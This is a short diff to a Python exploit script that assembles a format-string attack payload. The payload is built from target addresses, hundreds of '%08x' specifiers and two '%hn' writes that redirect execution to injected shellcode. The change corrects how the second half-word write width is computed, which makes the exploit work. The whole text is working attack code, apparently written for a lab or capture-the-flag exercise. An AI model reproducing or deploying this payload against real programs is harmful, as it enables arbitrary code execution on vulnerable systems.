@@ -16,8 +16,10 @@ ADDRESSOFSHELL = b'\xBF\xFF\xEA\x9D'
 ADDRESSOFSHELL = bytearray(ADDRESSOFSHELL)
 ADDRESSOFSHELL.reverse()
 ADDRESSOFSHELL = bytes(ADDRESSOFSHELL)
-ADDRESSOFSHELL1 = bytes(str(int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540), 'utf-8')
-ADDRESSOFSHELL2 = bytes(str(int.from_bytes(ADDRESSOFSHELL[2:], 'big')), 'utf-8')
+ADDRESSOFSHELL1 = int.from_bytes(ADDRESSOFSHELL[0:2], 'big') - 2540
+ADDRESSOFSHELL2 = int.from_bytes(ADDRESSOFSHELL[2:], 'big') - ADDRESSOFSHELL1
+ADDRESSOFSHELL1 = bytes(str(ADDRESSOFSHELL1), 'utf-8')
+ADDRESSOFSHELL2 = bytes(str(ADDRESSOFSHELL2), 'utf-8')
 #print(ADDRESSOFSHELL1)
 
 
@@ -34,4 +36,4 @@ LENTGHOFREQUIRED = 316
 
 #print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%38609x' +  b'%hn' + SHELLCODE + b'\n')
+    stdout.write(ADDRESSTOWRITE2 + b'AAAA' + ADDRESSTOWRITE1 + b'%08x'*316 + b'%' + ADDRESSOFSHELL1 + b'x' + b'%hn' + b'%' + ADDRESSOFSHELL2 + b'x' +  b'%hn' + SHELLCODE + b'\n')
